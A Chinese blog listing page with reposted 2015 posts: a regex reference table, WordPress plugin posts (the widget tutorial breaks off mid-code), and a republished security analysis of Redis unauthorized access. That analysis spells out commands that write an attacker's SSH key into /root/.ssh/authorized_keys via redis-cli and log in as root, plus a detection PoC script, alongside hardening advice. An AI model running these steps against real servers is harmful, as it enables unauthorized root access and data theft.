<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  
  <title>第 6 页 | 博客</title>

  
  <meta name="author" content="403 Forbidden">
  

  

  

  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-status-bar-style" content="black">

  

  <meta property="og:site_name" content="博客"/>

  
  <meta property="og:image" content="/favicon.ico"/>
  

  <link href="/favicon.ico" rel="icon">
  <link rel="alternate" href="/atom.xml" title="博客" type="application/atom+xml">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
</head>


<body>
<div class="blog">
  <div class="content">

    <header>
  <div class="site-branding">
    <h1 class="site-title">
      <a href="/">博客</a>
    </h1>
    <p class="site-description"></p>
  </div>
  <nav class="site-navigation">
    <ul>
      
        <li><a href="/">主页</a></li>
      
        <li><a href="/categories">分类</a></li>
      
        <li><a href="/about.html">关于</a></li>
      
    </ul>
  </nav>
</header>

    <main class="site-main posts-loop">
    
  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/22/常用正则表达式/"><span>常用正则表达式</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/22/常用正则表达式/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-22T06:31:29.000Z">
          2015-11-22
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>说明：正则表达式通常用于两种任务：1.验证，2.搜索/替换。用于验证时，通常需要在前后分别加上^和$，以匹配整个待验证字符串；搜索/替换时是否加上此限定则根据搜索的要求而定，此外，也有可能要在前后加上\b而不是^和$。此表所列的常用正则表达式，除个别外均未在前后加上任何限定，请根据需要，自行处理。</p>
<table>
<thead>
<tr>
<th>说明</th>
<th>正则表达式</th>
</tr>
</thead>
<tbody>
<tr>
<td>网址（URL）</td>
<td>[a-zA-z]+://[^\s]*</td>
</tr>
<tr>
<td>IP地址(IP Address)</td>
<td>((2[0-4]\d&#124;25[0-5]&#124;[01]?\d\d?).){3}(2[0-4]\d&#124;25[0-5]&#124;[01]?\d\d?)</td>
</tr>
<tr>
<td>电子邮件(Email)</td>
<td>\w+([-+.]\w+)<em>@\w+([-.]\w+)</em>.\w+([-.]\w+)*</td>
</tr>
<tr>
<td>QQ号码</td>
<td>[1-9]\d{4,}</td>
</tr>
<tr>
<td>HTML标记(包含内容或自闭合)</td>
<td>&lt;(.<em>)(.</em>)&gt;.<em>&lt;\/\1&gt;&#124;&lt;(.</em>) \/&gt;</td>
</tr>
<tr>
<td>密码(由数字/大写字母/小写字母/标点符号组成，四种都必有，8位以上)</td>
<td>(?=^.{8,}$)(?=.<em>\d)(?=.</em>\W+)(?=.<em>[A-Z])(?=.</em>[a-z])(?!.<em>\n).</em>$</td>
</tr>
<tr>
<td>日期(年-月-日)</td>
<td>(\d{4}&#124;\d{2})-((1[0-2])&#124;(0?[1-9]))-(([12][0-9])&#124;(3[01])&#124;(0?[1-9]))</td>
</tr>
<tr>
<td>日期(月/日/年)</td>
<td>((1[0-2])&#124;(0?[1-9]))/(([12][0-9])&#124;(3[01])&#124;(0?[1-9]))/(\d{4}&#124;\d{2})</td>
</tr>
<tr>
<td>时间(小时:分钟, 24小时制)</td>
<td>((1&#124;0?)[0-9]&#124;2[0-3]):([0-5][0-9])</td>
</tr>
<tr>
<td>汉字(字符)</td>
<td>[\u4e00-\u9fa5]</td>
</tr>
<tr>
<td>中文及全角标点符号(字符)</td>
<td>[\u3000-\u301e\ufe10-\ufe19\ufe30-\ufe44\ufe50-\ufe6b\uff01-\uffee]</td>
</tr>
<tr>
<td>中国大陆固定电话号码</td>
<td>(\d{4}-&#124;\d{3}-)?(\d{8}&#124;\d{7})</td>
</tr>
<tr>
<td>中国大陆手机号码</td>
<td>1\d{10}</td>
</tr>
<tr>
<td>中国大陆邮政编码</td>
<td>[1-9]\d{5}</td>
</tr>
<tr>
<td>中国大陆身份证号(15位或18位)</td>
<td>\d{15}(\d\d[0-9xX])?</td>
</tr>
<tr>
<td>非负整数(正整数或零)</td>
<td>\d+</td>
</tr>
<tr>
<td>正整数</td>
<td>[0-9]<em>[1-9][0-9]</em></td>
</tr>
<tr>
<td>负整数</td>
<td>-[0-9]<em>[1-9][0-9]</em></td>
</tr>
<tr>
<td>整数</td>
<td>-?\d+</td>
</tr>
<tr>
<td>小数</td>
<td>(-?\d+)(.\d+)?</td>
</tr>
<tr>
<td>不包含abc的单词</td>
<td>\b((?!abc)\w)+\b</td>
</tr>
</tbody>
</table>
<p>转载自 <a href="http://deerchao.net/tutorials/regex/common.htm" target="_blank" rel="noopener">http://deerchao.net/tutorials/regex/common.htm</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/22/常用正则表达式/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/"><span>Redis 未授权访问配合 SSH key 文件利用分析</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-11T22:00:55.000Z">
          2015-11-12
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>Redis 未授权访问的问题是一直存在的问题，知道创宇安全研究团队历史上也做过相关的应急，今日，又出现 Redis 未授权访问配合 SSH key 文件被利用的情况，今天我们来简要的分析下。</p>
<p><strong>一、漏洞概述</strong><br>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公网上，如果在没有开启认证的情况下，可以导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下可以利用 Redis 的相关方法，可以成功在 Redis 服务器上写入公钥，进而可以使用对应私钥直接登录目标服务器。</p>
<p><strong>1、漏洞描述</strong><br>Redis 安全模型的观念是: “请不要将 Redis 暴露在公开网络中, 因为让不受信任的客户接触到 Redis 是非常危险的” 。Redis 作者之所以放弃解决未授权访问导致的不安全性是因为, 99.99% 使用 Redis 的场景都是在沙盒化的环境中, 为了0.01%的可能性增加安全规则的同时也增加了复杂性, 虽然这个问题的并不是不能解决的, 但是这在他的设计哲学中仍是不划算的。<br>为其他受信任用户需要使用 Redis 或者因为运维人员的疏忽等原因，部分 Redis 绑定在 0.0.0.0:6379，并且没有开启认证（这是Redis 的默认配置），如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，将会导致 Redis 服务直接暴露在公网上，导致其他用户可以直接在非授权情况下直接访问Redis服务并进行相关操作。<br>利 Redis 自身的提供的 config 命令，可以进行写文件操作，攻击者可以成功将自己的公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以直接使用对应的私钥登录目标服务器。</p>
<p><strong>2、漏洞影响</strong><br>Redis 暴露在公网（即绑定在0.0.0.0:6379，目标IP公网可访问），并且没有开启相关认证和添加相关安全策略情况下可受影响而导致被利用。<br>通过ZoomEye 的搜索结果显示，有97707在公网可以直接访问的Redis服务。<br><a href="/uploads/2015/11/QQ20151111-0@2x.png"><img src="/uploads/2015/11/QQ20151111-0@2x.png" alt="QQ20151111-0@2x"></a><br>根据 ZoomEye 的探测，全球无验证可直接利用Redis 分布情况如下：<br><a href="/uploads/2015/11/1副本.png"><img src="/uploads/2015/11/1副本.png" alt="1副本"></a><br>全球无验证可直接利用Redis TOP 10国家与地区：<br><a href="/uploads/2015/11/2副本.png"><img src="/uploads/2015/11/2副本.png" alt="2副本"></a></p>
<p><strong>3、漏洞分析与利用</strong><br>首先在本地生产公私钥文件：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span>ssh-keygen –t rsa</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/11/ssh-keygen.png"><img src="/uploads/2015/11/ssh-keygen.png" alt="ssh-keygen"></a><br>然后将公钥写入 foo.txt 文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> (echo -e "\n\n"; cat id_rsa.pub; echo -e "\n\n") &gt; foo.txt</span><br></pre></td></tr></table></figure></p>
<p>再连接 Redis 写入文件<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> cat foo.txt | redis-cli -h 192.168.1.11 -x set crackit</span><br><span class="line"><span class="meta">$</span> redis-cli -h 192.168.1.11</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config set dir /root/.ssh/</span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config get dir</span><br><span class="line">1) "dir"</span><br><span class="line">2) "/root/.ssh"</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; config set dbfilename "authorized_keys"</span><br><span class="line">OK</span><br><span class="line"><span class="meta">$</span> 192.168.1.11:6379&gt; save</span><br><span class="line">OK</span><br></pre></td></tr></table></figure></p>
<p><a href="/uploads/2015/11/redis_ssh.png"><img src="/uploads/2015/11/redis_ssh.png" alt="redis_ssh"></a><br>这样就可以成功的将自己的公钥写入 /root/.ssh 文件夹的 authotrized_keys 文件里，然后攻击者直接执行：<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ssh –i  id_rsa root@192.168.1.11</span><br></pre></td></tr></table></figure></p>
<p>即可远程利用自己的私钥登录该服务器。<br>当然，写入的目录不限于 /root/.ssh 下的authorized_keys，也可以写入用户目录，不过 Redis 很多以 root 权限运行，所以写入 root 目录下，可以跳过猜用户的步骤。</p>
<p><strong>4、Redis 未授权的其他危害与利用</strong><br><strong>a）数据库数据泄露</strong><br>Redis 作为数据库，保存着各种各样的数据，如果存在未授权访问的情况，将会导致数据的泄露，其中包含保存的用户信息等。<br><a href="/uploads/2015/11/redis_user.png"><img src="/uploads/2015/11/redis_user.png" alt="redis_user"></a></p>
<p><strong>b）代码执行</strong><br>Redis可以嵌套Lua脚本的特性将会导致代码执行, 危害同其他服务器端的代码执行, 样例如下<br>一旦攻击者能够在服务器端执行任意代码, 攻击方式将会变得多且复杂, 这是非常危险的.<br><a href="/uploads/2015/11/redis_lua.png"><img src="/uploads/2015/11/redis_lua.png" alt="redis_lua"></a><br>通过<a href="https://github.com/evilpacket/redis-sha-crack" target="_blank" rel="noopener">Lua代码</a>(<a href="/uploads/2015/11/redis-sha-crack-master.zip">redis-sha-crack-master</a>)攻击者可以调用 redis.sha1hex() 函数，恶意利用 Redis 服务器进行 SHA-1 的破解。</p>
<p><strong>c）敏感信息泄露</strong><br>通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫。<br><a href="/uploads/2015/11/redis_info.png"><img src="/uploads/2015/11/redis_info.png" alt="redis_info"></a><br>可以看到泄露了很多 Redis 服务器的信息, 有当前 Redis 版本, 内存运行状态, 服务端个数等等敏感信息。</p>
<p><strong>5、漏洞验证</strong><br>可以使用Pocsuite（<a href="http://github.com/knownsec/pocsuite" target="_blank" rel="noopener">http://github.com/knownsec/pocsuite</a>）执行以下的代码可以用于测试目标地址是否存在未授权的Redis服务。<br>[python]#!/usr/bin/env python</p>
<h1 id="coding-utf-8"><a href="#coding-utf-8" class="headerlink" title="-- coding:utf-8 --"></a>-<em>- coding:utf-8 -</em>-</h1><p>import socket<br>import urlparse<br>from pocsuite.poc import POCBase, Output<br>from pocsuite.utils import register</p>
<p>class TestPOC(POCBase):<br>    vulID = ‘89339’<br>    version = ‘1’<br>    author = [‘Anonymous’]<br>    vulDate = ‘2015-10-26’<br>    createDate = ‘2015-10-26’<br>    updateDate = ‘2015-10-26’<br>    references = [‘<a href="http://sebug.net/vuldb/ssvid-89339&#39;]" target="_blank" rel="noopener">http://sebug.net/vuldb/ssvid-89339&#39;]</a><br>    name = ‘Redis 未授权访问 PoC’<br>    appPowerLink = ‘<a href="http://redis.io/&#39;" target="_blank" rel="noopener">http://redis.io/&#39;</a><br>    appName = ‘Redis’<br>    appVersion = ‘All’<br>    vulType = ‘Unauthorized access’<br>    desc = ‘’’<br>        redis 默认不需要密码即可访问，黑客直接访问即可获取数据库中所有信息，造成严重的信息泄露。<br>    ‘’’<br>    samples = [‘’]</p>
<pre><code>def _verify(self):
    result = {}
    payload = &apos;\x2a\x31\x0d\x0a\x24\x34\x0d\x0a\x69\x6e\x66\x6f\x0d\x0a&apos;
    s = socket.socket()
    socket.setdefaulttimeout(10)
    try:
        host = urlparse.urlparse(self.url).netloc
        port = 6379
        s.connect((host, port))
        s.send(payload)
        recvdata = s.recv(1024)
        if recvdata and &apos;redis_version&apos; in recvdata:
            result[&apos;VerifyInfo&apos;] = {}
            result[&apos;VerifyInfo&apos;][&apos;URL&apos;] = self.url
            result[&apos;VerifyInfo&apos;][&apos;Port&apos;] = port
    except:
        pass
    s.close()
    return self.parse_attack(result)

def _attack(self):
    return self._verify()

def parse_attack(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail(&apos;Internet nothing returned&apos;)
    return output
</code></pre><p>register(TestPOC)[/python]</p>
<p><strong>二、安全建议</strong><br>配置bind选项，限定可以连接Redis服务器的IP，修改 Redis 的默认端口6379<br>配置认证，也就是AUTH，设置密码，密码会以明文方式保存在Redis配置文件中<br>配置rename-command 配置项 “RENAME_CONFIG”，这样即使存在未授权访问，也能够给攻击者使用config 指令加大难度<br>好消息是Redis作者表示将会开发”real user”，区分普通用户和admin权限，普通用户将会被禁止运行某些命令，如config</p>
<p><strong>三、参考链接</strong></p>
<ul>
<li><a href="http://www.sebug.net/vuldb/ssvid-89339" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89339</a></li>
</ul>
<ul>
<li><a href="http://antirez.com/news/96" target="_blank" rel="noopener">http://antirez.com/news/96</a></li>
</ul>
<ul>
<li><a href="http://www.secpulse.com/archives/5366.html" target="_blank" rel="noopener">http://www.secpulse.com/archives/5366.html</a></li>
</ul>
<ul>
<li><a href="http://www.sebug.net/vuldb/ssvid-89715" target="_blank" rel="noopener">http://www.sebug.net/vuldb/ssvid-89715</a></li>
</ul>
<p>转载自 <a href="http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/" target="_blank" rel="noopener">http://blog.knownsec.com/2015/11/analysis-of-redis-unauthorized-of-expolit/</a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/Web-开发/">Web 开发</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/12/Redis 未授权访问配合 SSH key 文件利用分析/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/04/发布个金十数据插件/"><span>发布个金十数据插件</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/04/发布个金十数据插件/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-04T07:05:34.000Z">
          2015-11-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>好久没像现在这样正式的发布一个东西了，作为我 WordPress 插件的处女作，正好财经类的东西也没多少人做，我很严肃的想了想正好可以填补这个空白。。。嗯废话少说上截图:<br><a href="/uploads/2015/11/Screenshot_2015-11-04-22-50-35.png"><img src="/uploads/2015/11/Screenshot_2015-11-04-22-50-35.png" alt="Screenshot_2015-11-04-22-50-35"></a><br>本插件以小工具形式显示，您可以到外观–&gt;小工具下配置。<br>服务端的为 node.js 编写，<a href="https://github.com/jshensh/auagprice" target="_blank" rel="noopener">https://github.com/jshensh/auagprice</a><br>插件不单独发布源码，请访问 <a href="https://wordpress.org/plugins/jin10" target="_blank" rel="noopener">https://wordpress.org/plugins/jin10</a> 或者后台搜索 jin10 安装插件：<br><a href="/uploads/2015/11/QQ图片20151126001439.png"><img src="/uploads/2015/11/QQ图片20151126001439.png" alt="QQ图片20151126001439"></a></p>

      
    </div>

  </div>

  <div class="article-footer">
    <div class="article-meta pull-left">

    
      

    <span class="post-categories">
      <i class="icon-categories"></i>
        <a href="/categories/程序发布/">程序发布</a>
    </span>
    

    

    </div>

    
    <div class="article-meta pull-right">
      <span>
        <i class="icon-comments"></i>
        <span>
          <a href="/2015/11/04/发布个金十数据插件/#comment">评论</a>
        </span>
      </span>
    </div>
    
  </div>
</article>



  <article>

  
    
    <h3 class="article-title"><a href="/2015/11/04/WordPress 插件开发实例 – 详细注释的 Widget 开发例子/"><span>WordPress 插件开发实例 – 详细注释的 Widget 开发例子</span></a></h3>
    
  

  <div class="article-top-meta">
    <span class="posted-on">
      <a href="/2015/11/04/WordPress 插件开发实例 – 详细注释的 Widget 开发例子/" rel="bookmark">
        <time class="entry-date published" datetime="2015-11-04T02:24:27.000Z">
          2015-11-04
        </time>
      </a>
    </span>
  </div>


  

  <div class="article-content">
    <div class="entry">
      
        <p>在 wp-content\plugins 下创建 example-widget.php 代码如下 :</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Plugin Name: Example Widget</span></span><br><span class="line"><span class="comment"> * Plugin URI: http://example.com/widget</span></span><br><span class="line"><span class="comment"> * Description: A widget that serves as an example for developing more advanced widgets.</span></span><br><span class="line"><span class="comment"> * Version: 0.1</span></span><br><span class="line"><span class="comment"> * Author: Justin Tadlock</span></span><br><span class="line"><span class="comment"> * Author URI: http://justintadlock.com</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * This program is distributed in the hope that it will be useful,</span></span><br><span class="line"><span class="comment"> * but WITHOUT ANY WARRANTY; without even the implied warranty of</span></span><br><span class="line"><span class="comment"> * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Add function to widgets_init that'll load our widget.</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 0.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">add_action( <span class="string">'widgets_init'</span>, <span class="string">'example_load_widgets'</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Register our widget.</span></span><br><span class="line"><span class="comment"> * 'Example_Widget' is the widget class used below.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 0.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">example_load_widgets</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    register_widget( <span class="string">'Example_Widget'</span> );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Example Widget class.</span></span><br><span class="line"><span class="comment"> * This class handles everything that needs to be handled with the widget:</span></span><br><span class="line"><span class="comment"> * the settings, form, display, and update.  Nice!</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 0.1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example_Widget</span> <span class="keyword">extends</span> <span class="title">WP_Widget</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Widget setup.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Example_Widget</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">/* Widget settings. */</span></span><br><span class="line">        $widget_ops = <span class="keyword">array</span>( <span class="string">'classname'</span> =&gt; <span class="string">'example'</span>, <span class="string">'description'</span> =&gt; __(<span class="string">'An example widget that displays a person\'s name and sex.'</span>, <span class="string">'example'</span>) );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Widget control settings. */</span></span><br><span class="line">        $control_ops = <span class="keyword">array</span>( <span class="string">'width'</span> =&gt; <span class="number">300</span>, <span class="string">'height'</span> =&gt; <span class="number">350</span>, <span class="string">'id_base'</span> =&gt; <span class="string">'example-widget'</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Create the widget. */</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;WP_Widget( <span class="string">'example-widget'</span>, __(<span class="string">'Example Widget'</span>, <span class="string">'example'</span>), $widget_ops, $control_ops );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * How to display the widget on the screen.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">widget</span><span class="params">( $args, $instance )</span> </span>&#123;</span><br><span class="line">        extract( $args );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Our variables from the widget settings. */</span></span><br><span class="line">        $title = apply_filters(<span class="string">'widget_title'</span>, $instance[<span class="string">'title'</span>] );</span><br><span class="line">        $name = $instance[<span class="string">'name'</span>];</span><br><span class="line">        $sex = $instance[<span class="string">'sex'</span>];</span><br><span class="line">        $show_sex = <span class="keyword">isset</span>( $instance[<span class="string">'show_sex'</span>] ) ? $instance[<span class="string">'show_sex'</span>] : <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Before widget (defined by themes). */</span></span><br><span class="line">        <span class="keyword">echo</span> $before_widget;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Display the widget title if one was input (before and after defined by themes). */</span></span><br><span class="line">        <span class="keyword">if</span> ( $title )</span><br><span class="line">            <span class="keyword">echo</span> $before_title . $title . $after_title;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Display name from widget settings if one was input. */</span></span><br><span class="line">        <span class="keyword">if</span> ( $name )</span><br><span class="line">            printf( <span class="string">'&lt;p&gt;'</span> . __(<span class="string">'Hello. My name is %1$s.'</span>, <span class="string">'example'</span>) . <span class="string">'&lt;/p&gt;'</span>, $name );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* If show sex was selected, display the user's sex. */</span></span><br><span class="line">        <span class="keyword">if</span> ( $show_sex )</span><br><span class="line">            printf( <span class="string">'&lt;p&gt;'</span> . __(<span class="string">'I am a %1$s.'</span>, <span class="string">'example.'</span>) . <span class="string">'&lt;/p&gt;'</span>, $sex );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* After widget (defined by themes). */</span></span><br><span class="line">        <span class="keyword">echo</span> $after_widget;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Update the widget settings.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">update</span><span class="params">( $new_instance, $old_instance )</span> </span>&#123;</span><br><span class="line">        $instance = $old_instance;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Strip tags for title and name to remove HTML (important for text inputs). */</span></span><br><span class="line">        $instance[<span class="string">'title'</span>] = strip_tags( $new_instance[<span class="string">'title'</span>] );</span><br><span class="line">        $instance[<span class="string">'name'</span>] = strip_tags( $new_instance[<span class="string">'name'</span>] );</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* No need to strip tags for sex and show_sex. */</span></span><br><span class="line">        $instance[<span class="string">'sex'</span>] = $new_instance[<span class="string">'sex'</span>];</span><br><span class="line">        $instance[<span class="string">'show_sex'</span>] = $new_instance[<span class="string">'show_sex'</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $instance;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Displays the widget settings controls on the widget panel.</span></span><br><span class="line"><span class="comment">     * Make use of the get_field_id() and get_field_name() function</span></span><br><span class="line"><span class="comment">     * when creating your form elements. This handles the confusing stuff.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">form</span><span class="params">( $instance )</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Set up some default widget settings. */</span></span><br><span class="line">        $defaults = <span class="keyword">array</span>( <span class="string">'title'</span> =&gt; __(<span class="string">'Example'</span>, <span class="string">'example'</span>), <span class="string">'name'</span> =&gt; __(<span class="string">'John Doe'</span>, <span class="string">'example'</span>), <span class="string">'sex'</span> =&gt; <span class="string">'male'</span>, <span class="string">'show_sex'</span> =&gt; <span class="keyword">true</span> );</span><br><span class="line">        $instance = wp_parse_args( (<span class="keyword">array</span>) $instance, $defaults ); <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">        &lt;!-- Widget Title: Text Input --&gt;</span><br><span class="line">        &lt;p&gt;</span><br><span class="line">            &lt;label <span class="keyword">for</span>=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'title' ); ?&gt;"</span>&gt;<span class="meta">&lt;?php</span> _e(<span class="string">'Title:'</span>, <span class="string">'hybrid'</span>); <span class="meta">?&gt;</span>&lt;/label&gt;</span><br><span class="line">            &lt;input id=<span class="string">"&lt;?php echo $this-&gt;get_field_id( 'title' ); ?&gt;"</span> name=<span class="string">"&lt;?php echo $this-&gt;get_field_name( 'title' ); ?&gt;"</span> value=<span class="string">"&lt;?php echo $instance['title']; ?&gt;"</span> style=<span class="string">"width:100%;"</span> /&gt;</span><br><span class="line">        &lt;/p&gt;</span><br><span class="line"></span><br><span class="line">        &lt;!-- Your Name: 